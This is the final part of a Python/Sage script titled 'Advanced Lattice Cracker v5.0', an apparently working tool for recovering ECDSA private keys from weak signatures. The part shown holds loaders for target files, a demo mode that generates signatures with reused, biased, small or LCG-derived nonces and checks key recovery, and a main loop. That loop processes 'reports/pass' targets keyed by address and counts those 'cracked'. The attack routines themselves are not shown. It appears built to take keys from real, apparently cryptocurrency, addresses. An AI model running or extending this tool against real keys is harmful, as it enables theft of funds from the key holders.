        "success": result is not None,
    }


# ==============================================================================
# INPUT LOADERS — JSON, CSV, DIRECTORY
# ==============================================================================
def load_targets_from_json(filepath):
    """Load targets from a JSON file. Supports both single-target and array formats."""
    targets = []
    try:
        with open(filepath, "r") as f:
            data = json.load(f)
            if isinstance(data, dict):
                if 'address' not in data:
                    data['address'] = os.path.basename(filepath).replace('.json', '')
                data['_source_file'] = filepath
                targets.append(data)
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict):
                        if 'address' not in item:
                            item['address'] = os.path.basename(filepath).replace('.json', '')
                        item['_source_file'] = filepath
                        targets.append(item)
    except (json.JSONDecodeError, IOError) as e:
        logger.warning(f"Failed to load {filepath}: {e}")
        print(f"[!] Skipping bad JSON: {filepath} ({e})")
    return targets


def load_targets_from_csv(filepath, pubkey=None):
    """Load signatures from a CSV file (r,s,z columns).
    If pubkey is provided, constructs a single target with all sigs.
    CSV format: r,s,z (hex values, with or without 0x prefix)
    Also supports: R,S,Z or sig_r,sig_s,hash_z column names."""
    sigs = []
    try:
        with open(filepath, "r") as f:
            reader = csv.DictReader(f)
            # Normalize column names
            for row in reader:
                # Try various column name conventions
                r_val = row.get('r') or row.get('R') or row.get('sig_r') or row.get('r_hex', '')
                s_val = row.get('s') or row.get('S') or row.get('sig_s') or row.get('s_hex', '')
                z_val = row.get('z') or row.get('Z') or row.get('hash_z') or row.get('z_hex') or row.get('msg', '')

                if not (r_val and s_val and z_val):
                    continue

                # Strip 0x prefix if present
                r_val = r_val.strip().lower()
                s_val = s_val.strip().lower()
                z_val = z_val.strip().lower()
                if r_val.startswith('0x'): r_val = r_val[2:]
                if s_val.startswith('0x'): s_val = s_val[2:]
                if z_val.startswith('0x'): z_val = z_val[2:]

                # Validate hex
                try:
                    int(r_val, 16)
                    int(s_val, 16)
                    int(z_val, 16)
                except ValueError:
                    continue

                sig = {'r': r_val, 's': s_val, 'z': z_val}
                # Also grab pubkey from CSV if present
                pk = row.get('pubkey') or row.get('public_key') or row.get('pub', '')
                if pk:
                    sig['_pubkey'] = pk.strip()
                sigs.append(sig)
    except (IOError, csv.Error) as e:
        logger.warning(f"Failed to load CSV {filepath}: {e}")
        print(f"[!] Error reading CSV: {filepath} ({e})")
        return []

    if not sigs:
        return []

    # Determine pubkey
    if not pubkey:
        # Try to get from first sig's _pubkey field
        for sig in sigs:
            if '_pubkey' in sig:
                pubkey = sig['_pubkey']
                break
    if not pubkey:
        print(f"[!] CSV loaded {len(sigs)} sigs but no pubkey found. Use --pubkey to specify.")
        return []

    # Clean up _pubkey from sig dicts
    for sig in sigs:
        sig.pop('_pubkey', None)

    target = {
        'address': os.path.basename(filepath).replace('.csv', ''),
        'pubkey': pubkey,
        'signatures': sigs,
        '_source_file': filepath,
    }
    return [target]


def load_targets_from_directory(dirpath):
    """Load all JSON targets from a directory."""
    targets = []
    if not os.path.isdir(dirpath):
        return targets
    for fn in sorted(os.listdir(dirpath)):
        if fn.endswith(".json"):
            fp = os.path.join(dirpath, fn)
            targets.extend(load_targets_from_json(fp))
    return targets


# ==============================================================================
# DEMO MODE — SYNTHETIC VULNERABLE SIGNATURES
# ==============================================================================
def generate_demo_target(vulnerability="nonce_reuse", num_sigs=10):
    """Generate a synthetic target with known-vulnerable signatures for testing.
    Returns (target_dict, expected_private_key)."""
    # Generate a random private key
    d = int(ZZ.random_element(1, N - 1))
    pub_point = d * G
    x_bytes = int(pub_point[0]).to_bytes(32, 'big')
    prefix = b'\x02' if int(pub_point[1]) % 2 == 0 else b'\x03'
    pub_hex = (prefix + x_bytes).hex()

    sigs = []

    if vulnerability == "nonce_reuse":
        # Generate two sigs with same k
        k_shared = int(ZZ.random_element(1, N - 1))
        R_point = k_shared * G
        r_val = int(R_point[0]) % N
        for i in range(num_sigs):
            z = int(ZZ.random_element(1, N - 1))
            if i < 2:
                # Reuse same k for first two
                k = k_shared
                r = r_val
            else:
                k = int(ZZ.random_element(1, N - 1))
                R_pt = k * G
                r = int(R_pt[0]) % N
            s = (inverse_mod(k, N) * (z + r * d)) % N
            if s > N_HALF:
                s = N - s
            sigs.append({'r': hex(r)[2:], 's': hex(s)[2:], 'z': hex(z)[2:]})

    elif vulnerability == "linear_polynonce":
        # k_i = a*z_i + b (mod N) — linear polynonce
        a_coeff = int(ZZ.random_element(1, N - 1))
        b_coeff = int(ZZ.random_element(1, N - 1))
        for i in range(num_sigs):
            z = int(ZZ.random_element(1, N - 1))
            k = (a_coeff * z + b_coeff) % N
            if k == 0:
                k = 1
            R_pt = k * G
            r = int(R_pt[0]) % N
            s = (inverse_mod(k, N) * (z + r * d)) % N
            if s > N_HALF:
                s = N - s
            sigs.append({'r': hex(r)[2:], 's': hex(s)[2:], 'z': hex(z)[2:]})

    elif vulnerability == "msb_leak":
        # Top 32 bits of k are fixed (biased nonce)
        fixed_prefix = int(ZZ.random_element(0, 2**32 - 1))
        for i in range(num_sigs):
            z = int(ZZ.random_element(1, N - 1))
            k_low = int(ZZ.random_element(0, 2**224 - 1))
            k = (fixed_prefix << 224) | k_low
            k = k % N
            if k == 0:
                k = 1
            R_pt = k * G
            r = int(R_pt[0]) % N
            s = (inverse_mod(k, N) * (z + r * d)) % N
            if s > N_HALF:
                s = N - s
            sigs.append({'r': hex(r)[2:], 's': hex(s)[2:], 'z': hex(z)[2:]})

    elif vulnerability == "small_nonce":
        # k values are very small (< 2^64) — extreme MSB leak
        for i in range(num_sigs):
            z = int(ZZ.random_element(1, N - 1))
            k = int(ZZ.random_element(1, 2**64))
            R_pt = k * G
            r = int(R_pt[0]) % N
            s = (inverse_mod(k, N) * (z + r * d)) % N
            if s > N_HALF:
                s = N - s
            sigs.append({'r': hex(r)[2:], 's': hex(s)[2:], 'z': hex(z)[2:]})

    elif vulnerability == "lcg_nonce":
        # k_{i+1} = a*k_i + b mod N (LCG)
        a_lcg = int(ZZ.random_element(2, N - 1))
        b_lcg = int(ZZ.random_element(1, N - 1))
        k = int(ZZ.random_element(1, N - 1))
        for i in range(num_sigs):
            z = int(ZZ.random_element(1, N - 1))
            R_pt = k * G
            r = int(R_pt[0]) % N
            s = (inverse_mod(k, N) * (z + r * d)) % N
            if s > N_HALF:
                s = N - s
            sigs.append({'r': hex(r)[2:], 's': hex(s)[2:], 'z': hex(z)[2:]})
            k = (a_lcg * k + b_lcg) % N
            if k == 0:
                k = 1

    else:
        print(f"[!] Unknown vulnerability type: {vulnerability}")
        return None, None

    target = {
        'address': f'DEMO_{vulnerability}',
        'pubkey': pub_hex,
        'signatures': sigs,
        '_source_file': '',
    }
    return target, d


# ==============================================================================
# STATISTICS PRINTER
# ==============================================================================
def print_attack_statistics():
    """Print timing statistics for all attacks run this session."""
    if not _attack_stats:
        return
    print(f"\n{'─' * 70}", flush=True)
    print(f"  ATTACK TIMING STATISTICS ({len(_attack_stats)} total runs)", flush=True)
    print(f"{'─' * 70}", flush=True)

    # Group by attack type (strip sig count from label)
    from collections import defaultdict
    grouped = defaultdict(list)
    for label, elapsed, success in _attack_stats:
        # Extract base attack name (remove "( N sigs)" suffix)
        base = label.split('(')[0].strip()
        grouped[base].append((elapsed, success))

    # Sort by total time spent
    sorted_groups = sorted(grouped.items(), key=lambda x: sum(e for e, _ in x[1]), reverse=True)

    print(f"  {'Attack':<35} {'Runs':>5} {'Avg(s)':>7} {'Max(s)':>7} {'Hits':>5}", flush=True)
    print(f"  {'─' * 35} {'─' * 5} {'─' * 7} {'─' * 7} {'─' * 5}", flush=True)
    for name, runs in sorted_groups:
        avg_t = sum(e for e, _ in runs) / len(runs)
        max_t = max(e for e, _ in runs)
        hits = sum(1 for _, s in runs if s)
        print(f"  {name:<35} {len(runs):>5} {avg_t:>7.2f} {max_t:>7.2f} {hits:>5}", flush=True)

    total_time = sum(e for _, e, _ in _attack_stats)
    total_hits = sum(1 for _, _, s in _attack_stats if s)
    print(f"  {'─' * 35} {'─' * 5} {'─' * 7} {'─' * 7} {'─' * 5}", flush=True)
    print(f"  {'TOTAL':<35} {len(_attack_stats):>5} {'':>7} {total_time:>7.1f} {total_hits:>5}", flush=True)
    print(f"{'─' * 70}\n", flush=True)


# ==============================================================================
# MAIN ORCHESTRATOR — MULTIPROCESSING + ALL CORES
# ==============================================================================
def main():
    global SKIP_GCD, VERBOSE, QUIET, _attack_stats

    parser = argparse.ArgumentParser(
        description="Advanced Lattice Cracker v5.0 — 18 ECDSA attacks",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sage cracker.py                           # Process reports/pass/*.json
  sage cracker.py --dir ./my_targets/       # Process all JSON in directory
  sage cracker.py --file target.json        # Process single JSON file
  sage cracker.py --csv sigs.csv --pubkey 02abc...  # Process CSV signatures
  sage cracker.py --demo                    # Run self-test with synthetic sigs
  sage cracker.py --demo --vuln lcg_nonce   # Test specific vulnerability
  sage cracker.py -w 1 --verbose            # Sequential mode with full output
        """)
    parser.add_argument("-gcd", action="store_true",
                        help="Skip Phase 0 instant attacks (GCD + LCG)")
    parser.add_argument("-w", "--workers", type=int, default=0,
                        help="Number of parallel workers (0=auto, 1=sequential)")
    parser.add_argument("--file", type=str, default=None,
                        help="Path to a single JSON target file")
    parser.add_argument("--csv", type=str, default=None,
                        help="Path to a CSV file with r,s,z columns")
    parser.add_argument("--dir", type=str, default=None,
                        help="Directory containing JSON target files")
    parser.add_argument("--pubkey", type=str, default=None,
                        help="Public key hex (required for --csv if not in file)")
    parser.add_argument("--demo", action="store_true",
                        help="Run self-test with synthetic vulnerable signatures")
    parser.add_argument("--vuln", type=str, default=None,
                        choices=["nonce_reuse", "linear_polynonce", "msb_leak",
                                 "small_nonce", "lcg_nonce", "all"],
                        help="Vulnerability type for --demo mode (default: all)")
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Verbose output (show error details)")
    parser.add_argument("--quiet", "-q", action="store_true",
                        help="Quiet mode (only show successes)")
    parser.add_argument("--stats", action="store_true", default=True,
                        help="Show per-attack timing statistics at end (default: on)")
    parser.add_argument("--no-stats", action="store_true",
                        help="Disable per-attack timing statistics")
    args = parser.parse_args()

    SKIP_GCD = args.gcd
    VERBOSE = args.verbose
    QUIET = args.quiet
    _attack_stats = []

    total_t0 = time.time()

    # Auto-detect workers: use all cores but cap at 4 for 8GB RAM safety
    cores = cpu_count() or 1
    if args.workers > 0:
        num_workers = args.workers
    else:
        num_workers = min(cores, 4)

    print("=" * 70)
    print(" ADVANCED LATTICE CRACKER v5.0 — PARALLEL PROCESSING")
    print(f" 18 attacks | 8GB RAM Safe | MAX_SIGS={MAX_SIGS} | Workers={num_workers}")
    print(f" CPU Cores Detected: {cores} | Using: {num_workers}")
    if SKIP_GCD:
        print(f" FLAGS: -gcd (GCD + LCG attacks disabled)")
    if VERBOSE:
        print(f" FLAGS: --verbose (full error output)")
    if QUIET:
        print(f" FLAGS: --quiet (successes only)")
    print("=" * 70)

    # ════════════════ DEMO MODE ═══════════════════════════════════════
    if args.demo:
        vuln_types = ["nonce_reuse", "linear_polynonce", "msb_leak", "small_nonce", "lcg_nonce"]
        if args.vuln and args.vuln != "all":
            vuln_types = [args.vuln]

        print(f"\n[DEMO MODE] Testing {len(vuln_types)} vulnerability types...\n")
        demo_pass = 0
        demo_fail = 0

        for vuln in vuln_types:
            print(f"\n{'─' * 50}")
            print(f"  Generating: {vuln} (10 signatures)")
            tgt, expected_key = generate_demo_target(vuln, num_sigs=10)
            if tgt is None:
                demo_fail += 1
                continue

            res = process_target(tgt, num_workers=1)
            if res and res["success"]:
                recovered_key = int(res["result"]["priv"], 16)
                if recovered_key == expected_key:
                    print(f"  [PASS] {vuln}: Key correctly recovered!", flush=True)
                    demo_pass += 1
                else:
                    print(f"  [FAIL] {vuln}: Wrong key recovered!", flush=True)
                    demo_fail += 1
            else:
                print(f"  [FAIL] {vuln}: No key recovered.", flush=True)
                demo_fail += 1

        total_elapsed = time.time() - total_t0
        print(f"\n{'=' * 70}")
        print(f"  DEMO RESULTS: {demo_pass}/{demo_pass + demo_fail} passed ({total_elapsed:.1f}s)")
        if demo_fail == 0:
            print(f"  All attacks verified successfully!")
        else:
            print(f"  {demo_fail} attack(s) failed — check implementation")
        print(f"{'=' * 70}")

        if not args.no_stats:
            print_attack_statistics()
        return

    # ════════════════ LOAD TARGETS ════════════════════════════════════
    targets = []

    if args.file:
        targets = load_targets_from_json(args.file)
        if not targets:
            print(f"[!] No targets loaded from {args.file}")
            return

    elif args.csv:
        targets = load_targets_from_csv(args.csv, pubkey=args.pubkey)
        if not targets:
            print(f"[!] No targets loaded from {args.csv}")
            return

    elif args.dir:
        targets = load_targets_from_directory(args.dir)
        if not targets:
            print(f"[!] No targets found in {args.dir}")
            return

    else:
        # Default: process reports/pass/ directory in a loop
        target_dir = os.path.join(_SCRIPT_DIR, "reports", "pass")
        processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
        os.makedirs(processed_dir, exist_ok=True)

        if not os.path.isdir(target_dir):
            print(f"[!] Not found: {target_dir}")
            print("[!] Run the analyzer first, or use --file/--csv/--dir/--demo.")
            return

        global_recovered = 0
        global_targets = 0

        while True:
            targets = load_targets_from_directory(target_dir)

            # Deduplicate
            seen = set()
            unique = []
            for t in targets:
                addr = t.get('address', '')
                if addr not in seen:
                    seen.add(addr)
                    unique.append(t)
            targets = unique

            if not targets:
                if not QUIET:
                    print("\n[!] No more targets found in reports/pass/. Exiting.")
                break

            if not QUIET:
                print(f"\n[*] Loaded {len(targets)} targets.\n")

            recovered = []
            for tgt in targets:
                res = process_target(tgt, num_workers)
                if res and res["success"]:
                    recovered.append(res["result"])

            global_recovered += len(recovered)
            global_targets += len(targets)

        total_elapsed = time.time() - total_t0
        print(f"\n{'=' * 70}")
        print(f"   FINAL SUMMARY: {global_recovered} / {global_targets} targets cracked in total")
        print(f"   Total time: {total_elapsed:.1f}s | Workers: {num_workers}")
        print(f"{'=' * 70}")

        if not args.no_stats:
            print_attack_statistics()
        return

    # ════════════════ PROCESS LOADED TARGETS ══════════════════════════
    # Deduplicate
    seen = set()
    unique = []
    for t in targets:
        addr = t.get('address', '')
        if addr not in seen:
            seen.add(addr)
            unique.append(t)
    targets = unique

    if not QUIET:
        print(f"\n[*] Loaded {len(targets)} targets.\n")

    global_recovered = 0
    for tgt in targets:
        res = process_target(tgt, num_workers)
        if res and res["success"]:
            global_recovered += 1

    total_elapsed = time.time() - total_t0
    print(f"\n{'=' * 70}")
    print(f"   FINAL SUMMARY: {global_recovered} / {len(targets)} targets cracked")
    print(f"   Total time: {total_elapsed:.1f}s | Workers: {num_workers}")
    print(f"{'=' * 70}")

    if not args.no_stats:
        print_attack_statistics()


if __name__ == "__main__":
    main()
